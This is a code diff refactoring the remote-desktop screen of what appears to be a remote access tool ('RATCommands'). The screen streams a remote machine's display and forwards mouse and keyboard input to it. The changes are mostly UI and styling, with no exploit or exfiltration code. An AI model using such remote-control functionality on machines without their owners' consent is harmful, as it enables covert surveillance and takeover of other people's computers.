@@ -9,41 +9,43 @@ import {
   sendKeyboardInputCmd,
   sendMouseClickCmd,
 } from "../rat/RATCommands";
-
 import {
   IconHandClick,
   IconKeyboard,
   IconAdjustmentsAlt,
+  IconInfoCircle,
+  IconX,
+  IconShareplay,
 } from "@tabler/icons-react";
-
-interface RemoteDesktopFramePayload {
-  addr: string;
-  timestamp: number;
-  display: number;
-  data: string;
-}
+import { RemoteDesktopFramePayload } from "../../types";
 
 export const RemoteDesktop: React.FC = () => {
   const { addr } = useParams();
-
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const lastFrameRef = useRef<HTMLImageElement | null>(null);
   const imageSizeRef = useRef<{ width: number; height: number }>({
     width: 0,
     height: 0,
   });
+  const currentWindow = useRef<WebviewWindow | null>(null);
+
+  // UI state
   const [showControls, setShowControls] = useState(true);
+  const [connectionStatus, setConnectionStatus] =
+    useState<string>("Ready to connect");
+  const [showTooltip, setShowTooltip] = useState<string | null>(null);
+
+  // Stream settings
   const [streaming, setStreaming] = useState(false);
   const [quality, setQuality] = useState(35);
   const [fps, setFps] = useState(10);
   const [displays, setDisplays] = useState<number[]>([]);
   const [selectedDisplay, setSelectedDisplay] = useState(0);
-  const [connectionStatus, setConnectionStatus] =
-    useState<string>("Ready to connect");
-  const currentWindow = useRef<WebviewWindow | null>(null);
+
+  // Control states
   const [mouseControlEnabled, setMouseControlEnabled] = useState(false);
   const [keyboardControlEnabled, setKeyboardControlEnabled] = useState(false);
-  const [_isDragging, setIsDragging] = useState(false);
+  const [isDragging, setIsDragging] = useState(false);
   const [isMouseDown, setIsMouseDown] = useState(false);
   const [activeMouseButton, setActiveMouseButton] = useState<number | null>(
     null
@@ -51,17 +53,22 @@ export const RemoteDesktop: React.FC = () => {
   const [capsLockState, setCapsLockState] = useState(false);
   const [ctrlKeyState, setCtrlKeyState] = useState(false);
 
+  // Additional state
+  const [showKeyboardInfo, setShowKeyboardInfo] = useState(true);
+
+  // Initialize window reference
   useEffect(() => {
     currentWindow.current = getCurrent();
   }, [addr]);
 
+  // Initialize remote display and cleanup
   useEffect(() => {
     lastFrameRef.current = new Image();
 
     const grabDisplayData = async () => {
       try {
         const clientInfo: any = await fetchClientCmd(addr);
-        if (clientInfo && clientInfo.displays) {
+        if (clientInfo?.displays) {
           const displayArray = Array.from(
             { length: clientInfo.displays },
             (_, i) => i
@@ -82,125 +89,12 @@ export const RemoteDesktop: React.FC = () => {
     };
   }, []);
 
-  // Set up keyboard event listeners when keyboard control is enabled/disabled
-  useEffect(() => {
-    // Only add keyboard event listeners if streaming and keyboard control is enabled
-    if (!streaming || !keyboardControlEnabled || !addr) return;
-
-    // Function to handle key down events
-    const handleKeyDown = (event: KeyboardEvent) => {
-      // Prevent default behavior for all keys when keyboard control is enabled
-      // This prevents browser shortcuts from activating
-      event.preventDefault();
-
-      // Get key information
-      const keyCode = event.keyCode;
-      let character = event.key;
-
-      // Check if modifiers are pressed
-      const shiftPressed = event.shiftKey;
-      const ctrlPressed = event.ctrlKey;
-
-      // Update state for UI indicators
-      setCtrlKeyState(ctrlPressed);
-
-      // Check caps lock state
-      const capsLock = event.getModifierState("CapsLock");
-      setCapsLockState(capsLock);
-
-      // Special keys handling - for these keys we want to use the keyCode and not the character
-      const isSpecialKey =
-        character.length > 1 || // Non-printable characters
-        (keyCode >= 33 && keyCode <= 40) || // Page up/down, End, Home, Arrow keys
-        keyCode === 13 || // Enter
-        keyCode === 8 || // Backspace
-        keyCode === 9 || // Tab
-        keyCode === 27 || // Escape
-        keyCode === 46; // Delete
-
-      // If it's a special key, set character to empty as we'll use keyCode
-      if (isSpecialKey) {
-        character = "";
-      }
-
-      // Send the keyboard input to the client
-      sendKeyboardInputCmd(
-        addr,
-        keyCode,
-        character,
-        true,
-        shiftPressed,
-        ctrlPressed && !isSpecialKey, // Only send ctrl for non-special keys unless actually pressed with Ctrl
-        capsLock
-      ).catch((error) => {
-        console.error("Error sending keyboard down event:", error);
-      });
-    };
-
-    // Function to handle key up events
-    const handleKeyUp = (event: KeyboardEvent) => {
-      event.preventDefault();
-
-      const keyCode = event.keyCode;
-      let character = event.key;
-
-      const shiftPressed = event.shiftKey;
-      const ctrlPressed = event.ctrlKey;
-
-      // Update state for UI indicators
-      setCtrlKeyState(ctrlPressed);
-
-      const capsLock = event.getModifierState("CapsLock");
-      setCapsLockState(capsLock);
-
-      // Special keys handling
-      const isSpecialKey =
-        character.length > 1 || // Non-printable characters
-        (keyCode >= 33 && keyCode <= 40) || // Page up/down, End, Home, Arrow keys
-        keyCode === 13 || // Enter
-        keyCode === 8 || // Backspace
-        keyCode === 9 || // Tab
-        keyCode === 27 || // Escape
-        keyCode === 46; // Delete
-
-      // If it's a special key, set character to empty
-      if (isSpecialKey) {
-        character = "";
-      }
-
-      sendKeyboardInputCmd(
-        addr,
-        keyCode,
-        character,
-        false,
-        shiftPressed,
-        ctrlPressed && !isSpecialKey,
-        capsLock
-      ).catch((error) => {
-        console.error("Error sending keyboard up event:", error);
-      });
-    };
-
-    // Add event listeners to the document
-    document.addEventListener("keydown", handleKeyDown);
-    document.addEventListener("keyup", handleKeyUp);
-
-    // Clean up function to remove event listeners
-    return () => {
-      document.removeEventListener("keydown", handleKeyDown);
-      document.removeEventListener("keyup", handleKeyUp);
-    };
-  }, [streaming, keyboardControlEnabled, addr]);
-
+  // Process incoming frames
   useEffect(() => {
     const unlisten = listen("remote_desktop_frame", (event) => {
       const payload = event.payload as RemoteDesktopFramePayload;
 
-      if (payload.addr !== addr) {
-        return;
-      }
-
-      if (payload.display !== selectedDisplay) {
+      if (payload.addr !== addr || payload.display !== selectedDisplay) {
         return;
       }
 
@@ -237,38 +131,103 @@ export const RemoteDesktop: React.FC = () => {
     };
   }, [selectedDisplay]);
 
-  // Function to reset client-side keyboard state
-  const resetClientKeyboardState = async () => {
-    if (!addr) return;
+  // Handle keyboard control
+  useEffect(() => {
+    if (!streaming || !keyboardControlEnabled || !addr) return;
 
-    try {
-      // Send key up events for all modifier keys
+    const handleKeyDown = (event: KeyboardEvent) => {
+      event.preventDefault();
+
+      const keyCode = event.keyCode;
+      let character = event.key;
+      const shiftPressed = event.shiftKey;
+      const ctrlPressed = event.ctrlKey;
+      const capsLock = event.getModifierState("CapsLock");
+
+      setCtrlKeyState(ctrlPressed);
+      setCapsLockState(capsLock);
+
+      const isSpecialKey =
+        character.length > 1 ||
+        (keyCode >= 33 && keyCode <= 40) ||
+        keyCode === 13 ||
+        keyCode === 8 ||
+        keyCode === 9 ||
+        keyCode === 27 ||
+        keyCode === 46;
+
+      if (isSpecialKey) {
+        character = "";
+      }
+
       sendKeyboardInputCmd(
         addr,
-        0, // Not using a specific key code
-        "",
-        false, // Key up event
-        false,
-        false,
-        false
-      );
+        keyCode,
+        character,
+        true,
+        shiftPressed,
+        ctrlPressed && !isSpecialKey,
+        capsLock
+      ).catch((error) => {
+        console.error("Error sending keyboard down event:", error);
+      });
+    };
 
-      // Also reset our UI state
-      setCapsLockState(false);
-      setCtrlKeyState(false);
-    } catch (error) {
-      console.error("Error resetting keyboard state:", error);
-    }
-  };
+    const handleKeyUp = (event: KeyboardEvent) => {
+      event.preventDefault();
 
-  // Effect to clean up keyboard state when keyboard control is disabled or streaming stops
+      const keyCode = event.keyCode;
+      let character = event.key;
+      const shiftPressed = event.shiftKey;
+      const ctrlPressed = event.ctrlKey;
+      const capsLock = event.getModifierState("CapsLock");
+
+      setCtrlKeyState(ctrlPressed);
+      setCapsLockState(capsLock);
+
+      const isSpecialKey =
+        character.length > 1 ||
+        (keyCode >= 33 && keyCode <= 40) ||
+        keyCode === 13 ||
+        keyCode === 8 ||
+        keyCode === 9 ||
+        keyCode === 27 ||
+        keyCode === 46;
+
+      if (isSpecialKey) {
+        character = "";
+      }
+
+      sendKeyboardInputCmd(
+        addr,
+        keyCode,
+        character,
+        false,
+        shiftPressed,
+        ctrlPressed && !isSpecialKey,
+        capsLock
+      ).catch((error) => {
+        console.error("Error sending keyboard up event:", error);
+      });
+    };
+
+    document.addEventListener("keydown", handleKeyDown);
+    document.addEventListener("keyup", handleKeyUp);
+
+    return () => {
+      document.removeEventListener("keydown", handleKeyDown);
+      document.removeEventListener("keyup", handleKeyUp);
+    };
+  }, [streaming, keyboardControlEnabled, addr]);
+
+  // Reset keyboard state when control is disabled
   useEffect(() => {
     if (!keyboardControlEnabled || !streaming) {
-      // Reset both UI indicators and client-side state
       resetClientKeyboardState();
     }
   }, [keyboardControlEnabled, streaming]);
 
+  // Streaming control functions
   const stopStreamingAndCleanup = async () => {
     if (!streaming) return;
 
@@ -298,19 +257,19 @@ export const RemoteDesktop: React.FC = () => {
     setConnectionStatus("Ready to connect");
   };
 
-  const switchDisplay = async (newDisplay: number) => {
-    if (streaming) {
-      await stopRemoteDesktopCmd(addr);
+  // Mouse and keyboard control functions
+  const resetClientKeyboardState = async () => {
+    if (!addr) return;
 
-      setSelectedDisplay(newDisplay);
-
-      await startRemoteDesktopCmd(addr, newDisplay, quality, fps);
-    } else {
-      setSelectedDisplay(newDisplay);
+    try {
+      sendKeyboardInputCmd(addr, 0, "", false, false, false, false);
+      setCapsLockState(false);
+      setCtrlKeyState(false);
+    } catch (error) {
+      console.error("Error resetting keyboard state:", error);
     }
   };
 
-  // Convert client coordinates to remote screen coordinates
   const getTargetCoordinates = (clientX: number, clientY: number) => {
     if (!canvasRef.current) return { targetX: 0, targetY: 0 };
 
@@ -321,13 +280,13 @@ export const RemoteDesktop: React.FC = () => {
     const canvasX = clientX - rect.left;
     const canvasY = clientY - rect.top;
 
-    const targetX = Math.round(canvasX * scaleFactorX);
-    const targetY = Math.round(canvasY * scaleFactorY);
-
-    return { targetX, targetY };
+    return {
+      targetX: Math.round(canvasX * scaleFactorX),
+      targetY: Math.round(canvasY * scaleFactorY),
+    };
   };
 
-  // Handler for mouse down event
+  // Mouse event handlers
   const handleCanvasMouseDown = async (
     event: React.MouseEvent<HTMLCanvasElement>
   ) => {
@@ -335,11 +294,7 @@ export const RemoteDesktop: React.FC = () => {
 
     if (!mouseControlEnabled || !canvasRef.current || !addr || !streaming)
       return;
-
-    // Handle middle mouse button (button 1) and left/right buttons (0 and 2)
-    if (event.button !== 0 && event.button !== 1 && event.button !== 2) {
-      return;
-    }
+    if (event.button !== 0 && event.button !== 1 && event.button !== 2) return;
 
     setIsMouseDown(true);
     setActiveMouseButton(event.button);
@@ -364,7 +319,6 @@ export const RemoteDesktop: React.FC = () => {
     }
   };
 
-  // Handler for mouse up event
   const handleCanvasMouseUp = async (
     event: React.MouseEvent<HTMLCanvasElement>
   ) => {
@@ -378,10 +332,8 @@ export const RemoteDesktop: React.FC = () => {
       !isMouseDown
     )
       return;
-
-    if (activeMouseButton !== null && event.button !== activeMouseButton) {
-      return; // Only handle the button that was pressed down
-    }
+    if (activeMouseButton !== null && event.button !== activeMouseButton)
+      return;
 
     setIsMouseDown(false);
     setIsDragging(false);
@@ -399,7 +351,7 @@ export const RemoteDesktop: React.FC = () => {
         targetX,
         targetY,
         event.button,
-        2, // Mouse up
+        2,
         0
       );
     } catch (error) {
@@ -407,7 +359,6 @@ export const RemoteDesktop: React.FC = () => {
     }
   };
 
-  // Handler for mouse move event during dragging
   const handleCanvasMouseMove = async (
     event: React.MouseEvent<HTMLCanvasElement>
   ) => {
@@ -428,14 +379,13 @@ export const RemoteDesktop: React.FC = () => {
     );
 
     try {
-      // Just update the cursor position without changing button state
       await sendMouseClickCmd(
         addr,
         selectedDisplay,
         targetX,
         targetY,
         activeMouseButton || 0,
-        3, // Mouse move during drag (custom action type)
+        3,
         0
       );
     } catch (error) {
@@ -443,7 +393,6 @@ export const RemoteDesktop: React.FC = () => {
     }
   };
 
-  // Handler for wheel events (scrolling)
   const handleCanvasWheel = async (
     event: React.WheelEvent<HTMLCanvasElement>
   ) => {
@@ -456,9 +405,6 @@ export const RemoteDesktop: React.FC = () => {
       event.clientX,
       event.clientY
     );
-
-    // Determine scroll direction and amount
-    // Normalize the amount to a reasonable value
     const scrollAmount = Math.max(
       1,
       Math.min(10, Math.abs(Math.round(event.deltaY / 100)))
@@ -480,23 +426,19 @@ export const RemoteDesktop: React.FC = () => {
     }
   };
 
+  // UI control functions
   const toggleKeyboardControl = () => {
     const newState = !keyboardControlEnabled;
     setKeyboardControlEnabled(newState);
 
-    // Reset keyboard state when disabling keyboard control
     if (!newState && streaming) {
       resetClientKeyboardState();
     }
   };
 
-  const toggleControls = () => {
-    setShowControls(!showControls);
-  };
-
   const toggleMouseControl = () => {
     setMouseControlEnabled(!mouseControlEnabled);
-    // Reset drag state when disabling mouse control
+
     if (!mouseControlEnabled) {
       setIsMouseDown(false);
       setIsDragging(false);
@@ -504,162 +446,218 @@ export const RemoteDesktop: React.FC = () => {
     }
   };
 
+  const toggleControls = () => {
+    setShowControls(!showControls);
+  };
+
+  // UI helper functions
+  const showToolTip = (tip: string) => {
+    setShowTooltip(tip);
+  };
+
+  const hideTooltip = () => {
+    setShowTooltip(null);
+  };
+
+  // Render display options
   const displayOptions = displays.map((displayId) => (
     <option key={displayId} value={displayId}>
-      {displayId}
+      Display {displayId + 1}
     </option>
   ));
 
   return (
     <div className="relative w-screen h-screen bg-black flex flex-col items-center p-0 m-0">
-      <div className="fixed top-2 left-2 z-10 bg-primarybg bg-opacity-70 text-white p-2 rounded-full transition-opacity flex flex-col gap-2">
+      {/* Side controls */}
+      <div className="fixed top-4 left-4 z-10 flex flex-col gap-3">
         <button
-          className={`text-white p-2 rounded-full opacity-70 hover:opacity-100 transition-opacity cursor-pointer ${
-            !showControls ? "bg-secondarybg" : "bg-white"
+          className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 cursor-pointer ${
+            !showControls
+              ? "bg-secondarybg bg-opacity-80"
+              : "bg-white bg-opacity-90"
           }`}
           onClick={toggleControls}
-          title={showControls ? "Hide Controls" : "Show Controls"}
+          onMouseEnter={() =>
+            showToolTip(showControls ? "Hide Controls" : "Show Controls")
+          }
+          onMouseLeave={hideTooltip}
         >
           <IconAdjustmentsAlt
-            size={22}
+            size={24}
+            className="transition-transform duration-300"
+            style={{ transform: showControls ? "rotate(180deg)" : "rotate(0)" }}
             color={!showControls ? "white" : "black"}
           />
         </button>
 
         <button
-          className={`p-2 rounded-full opacity-70 hover:opacity-100 transition-opacity cursor-pointer ${
-            mouseControlEnabled ? "bg-white" : "bg-secondarybg"
-          }`}
-          onClick={toggleMouseControl}
-          title={
+          className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 cursor-pointer ${
             mouseControlEnabled
-              ? "Disable Mouse Control"
-              : "Enable Mouse Control"
+              ? "bg-white bg-opacity-90"
+              : "bg-secondarybg bg-opacity-80"
+          } ${!streaming ? "opacity-50" : ""}`}
+          onClick={toggleMouseControl}
+          onMouseEnter={() =>
+            showToolTip(
+              mouseControlEnabled
+                ? "Disable Mouse Control"
+                : "Enable Mouse Control"
+            )
           }
+          onMouseLeave={hideTooltip}
+          disabled={!streaming}
         >
           <IconHandClick
-            size={22}
+            size={24}
             color={mouseControlEnabled ? "black" : "white"}
+            className={!streaming ? "opacity-50" : ""}
           />
         </button>
 
         <button
-          className={`p-2 rounded-full opacity-70 hover:opacity-100 transition-opacity cursor-pointer ${
-            keyboardControlEnabled ? "bg-white" : "bg-secondarybg"
-          }`}
-          onClick={toggleKeyboardControl}
-          title={
+          className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 cursor-pointer ${
             keyboardControlEnabled
-              ? "Disable Keyboard Control"
-              : "Enable Keyboard Control"
+              ? "bg-white bg-opacity-90"
+              : "bg-secondarybg bg-opacity-80"
+          } ${!streaming ? "opacity-50" : ""}`}
+          onClick={toggleKeyboardControl}
+          onMouseEnter={() =>
+            showToolTip(
+              keyboardControlEnabled
+                ? "Disable Keyboard Control"
+                : "Enable Keyboard Control"
+            )
           }
+          onMouseLeave={hideTooltip}
+          disabled={!streaming}
         >
           <IconKeyboard
-            size={22}
+            size={24}
             color={keyboardControlEnabled ? "black" : "white"}
+            className={!streaming ? "opacity-50" : ""}
           />
         </button>
       </div>
 
+      {/* Tooltip */}
+      {showTooltip && (
+        <div className="fixed top-4 left-20 z-20 bg-black bg-opacity-90 text-white px-3 py-2 rounded-lg text-sm shadow-lg">
+          {showTooltip}
+        </div>
+      )}
+
+      {/* Main controls */}
       {showControls && (
-        <div className="absolute top-2 z-10 bg-primarybg bg-opacity-80 p-3 rounded-2xl flex flex-col items-center gap-3 text-white min-w-[300px]">
-          <div className="flex w-full justify-between items-center">
-            <h3 className="text-sm font-medium">Remote Desktop</h3>
-            <div className="flex items-center gap-2 pl-3">
+        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-10 bg-primarybg bg-opacity-90 backdrop-blur-md p-4 rounded-xl shadow-xl text-white max-w-lg w-full">
+          <div className="flex w-full justify-between items-center mb-3">
+            <div className="flex items-center gap-2">
+              <IconShareplay size={20} className="text-accentx" />
+              <h3 className="text-base font-medium">Remote Desktop</h3>
+            </div>
+
+            <div className="flex items-center gap-2">
               {keyboardControlEnabled && streaming && (
                 <span
-                  className={`text-xs px-2 py-1 bg-white text-black rounded-2xl ${
+                  className={`text-xs px-2 py-1 rounded-md font-medium ${
                     capsLockState
-                      ? "!bg-green-500 !text-black"
-                      : "!bg-red-500 !text-black"
+                      ? "bg-green-500 text-white"
+                      : "bg-gray-700 text-gray-300"
                   }`}
                 >
-                  {capsLockState ? "CAPS" : "CAPS"}
+                  CAPS
                 </span>
               )}
+
               {keyboardControlEnabled && streaming && (
                 <span
-                  className={`text-xs px-2 py-1 bg-white text-black rounded-2xl ${
+                  className={`text-xs px-2 py-1 rounded-md font-medium ${
                     ctrlKeyState
-                      ? "!bg-green-500 !text-black"
-                      : "!bg-red-500 !text-black"
+                      ? "bg-green-500 text-white"
+                      : "bg-gray-700 text-gray-300"
                   }`}
                 >
                   CTRL
                 </span>
               )}
-              <span className="text-xs px-2 py-1 bg-white text-black rounded-2xl border border-accentx">
+
+              <span
+                className={`text-xs px-3 py-1 rounded-md font-medium ${
+                  connectionStatus === "Connected"
+                    ? "bg-green-500 text-white"
+                    : connectionStatus === "Connecting..."
+                    ? "bg-yellow-500 text-black"
+                    : "bg-gray-700 text-white"
+                }`}
+              >
                 {connectionStatus}
               </span>
             </div>
           </div>
 
-          <div className="grid grid-cols-2 gap-3 w-full">
-            <div className="flex items-center rounded-full bg-secondarybg pl-3 border border-accentx h-9">
-              <div className="shrink-0 text-base text-accentx select-none sm:text-sm/6">
-                Display
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 w-full">
+            <div className="flex flex-col gap-4">
+              <div className="bg-secondarybg bg-opacity-70 rounded-lg flex items-center px-3 py-2 border border-gray-700">
+                <label className="text-sm text-accentx mr-2">Display:</label>
+                <select
+                  className={`block w-full text-sm bg-transparent focus:outline-none ${
+                    streaming ? "text-accentx cursor-not-allowed" : "text-white"
+                  }`}
+                  value={selectedDisplay}
+                  onChange={(e) => setSelectedDisplay(Number(e.target.value))}
+                  disabled={streaming}
+                >
+                  {displayOptions}
+                </select>
               </div>
-              <select
-                className={`block w-16 py-0 pl-2 text-base placeholder:text-gray-400 bg-transparent focus:outline-none sm:text-sm/6 ${
-                  streaming ? "text-accentx" : "text-white"
+
+              <div className="bg-secondarybg bg-opacity-70 rounded-lg flex items-center px-3 py-2 border border-gray-700">
+                <label className="text-sm text-accentx mr-2">Quality:</label>
+                <div className="flex-1 flex items-center gap-1">
+                  <input
+                    type="range"
+                    className="flex-1"
+                    min="1"
+                    max="100"
+                    value={quality}
+                    onChange={(e) => setQuality(Number(e.target.value))}
+                    disabled={streaming}
+                  />
+                  <span className="text-sm w-7 text-center text-white">
+                    {quality}
+                  </span>
+                </div>
+              </div>
+            </div>
+
+            <div className="flex flex-col gap-4">
+              <div className="bg-secondarybg bg-opacity-70 rounded-lg flex items-center px-3 py-2 border border-gray-700">
+                <label className="text-sm text-accentx mr-2">FPS:</label>
+                <div className="flex-1 flex items-center gap-1">
+                  <input
+                    type="range"
+                    className="flex-1"
+                    min="1"
+                    max="30"
+                    value={fps}
+                    onChange={(e) => setFps(Number(e.target.value))}
+                    disabled={streaming}
+                  />
+                  <span className="text-sm w-7 text-center text-white">
+                    {fps}
+                  </span>
+                </div>
+              </div>
+
+              <button
+                className={` text-sm w-full py-2 rounded-lg border transition-all duration-200 flex items-center justify-center font-medium cursor-pointer ${
+                  !streaming
+                    ? "border-green-500 bg-green-500 bg-opacity-40 text-white hover:bg-opacity-60"
+                    : "border-red-500 bg-red-500 bg-opacity-40 text-white hover:bg-opacity-60"
                 }`}
-                value={selectedDisplay}
-                onChange={(e) => switchDisplay(Number(e.target.value))}
-                disabled={streaming}
+                onClick={streaming ? handleStopStreaming : handleStartStreaming}
               >
-                {displayOptions}
-              </select>
-            </div>
-
-            <div className="flex items-center rounded-full bg-secondarybg pl-3 border border-accentx h-9">
-              <div className="shrink-0 text-base text-accentx select-none sm:text-sm/6">
-                Quality
-              </div>
-              <input
-                type="number"
-                className={`block w-16 py-0 pl-2 text-base placeholder:text-gray-400 bg-transparent focus:outline-none sm:text-sm/6 ${
-                  streaming ? "text-accentx" : "text-white"
-                }`}
-                min="1"
-                max="100"
-                value={quality}
-                onChange={(e) => setQuality(Number(e.target.value))}
-                disabled={streaming}
-              />
-            </div>
-
-            <div className="flex items-center rounded-full bg-secondarybg pl-3 border border-accentx h-9">
-              <div className="shrink-0 text-base text-accentx select-none sm:text-sm/6">
-                FPS:
-              </div>
-              <input
-                type="number"
-                className={`block w-16 py-0 pl-2 text-base placeholder:text-gray-400 bg-transparent focus:outline-none sm:text-sm/6 ${
-                  streaming ? "text-accentx" : "text-white"
-                }`}
-                min="1"
-                max="30"
-                value={fps}
-                onChange={(e) => setFps(Number(e.target.value))}
-              />
-            </div>
-
-            <div className="flex items-end text-sm">
-              {!streaming ? (
-                <button
-                  className="cursor-pointer rounded-full px-4 py-1.5 border border-accentx bg-active text-white hover:bg-white hover:text-black transition"
-                  onClick={handleStartStreaming}
-                >
-                  Start Streaming
-                </button>
-              ) : (
-                <button
-                  className="cursor-pointer rounded-full px-4 py-1.5 border border-accentx bg-inactive text-white hover:bg-white hover:text-black transition"
-                  onClick={handleStopStreaming}
-                >
-                  Stop Streaming
-                </button>
-              )}
+                {streaming ? "Stop Streaming" : "Start Streaming"}
+              </button>
             </div>
           </div>
         </div>
@@ -674,17 +672,23 @@ export const RemoteDesktop: React.FC = () => {
           onMouseMove={handleCanvasMouseMove}
           onWheel={handleCanvasWheel}
           onContextMenu={(event) => event.preventDefault()}
-          tabIndex={0} // Make canvas focusable for keyboard events
+          tabIndex={0}
         />
       </div>
 
-      {keyboardControlEnabled && streaming && (
-        <div className="fixed bottom-2 left-2 right-2 z-10 bg-primarybg bg-opacity-70 text-white p-2 rounded-lg text-center">
+      {keyboardControlEnabled && streaming && showKeyboardInfo && (
+        <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 z-10 bg-primarybg bg-opacity-90 backdrop-blur-md px-4 py-3 rounded-xl shadow-xl text-white max-w-lg flex items-center gap-2">
+          <IconInfoCircle size={18} className="text-accentx shrink-0" />
           <p className="text-sm">
-            Keyboard control active. Supported shortcuts: Ctrl+A (Select All),
-            Ctrl+C (Copy), Ctrl+V (Paste), Ctrl+X (Cut), Ctrl+Z (Undo), Ctrl+Y
-            (Redo), Ctrl+S (Save)
+            Keyboard control active. Supported: Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X,
+            Ctrl+Z, Ctrl+Y, Ctrl+S
           </p>
+          <button
+            className="ml-2 text-gray-400 hover:text-white cursor-pointer"
+            onClick={() => setShowKeyboardInfo(false)}
+          >
+            <IconX size={18} />
+          </button>
         </div>
       )}
     </div>
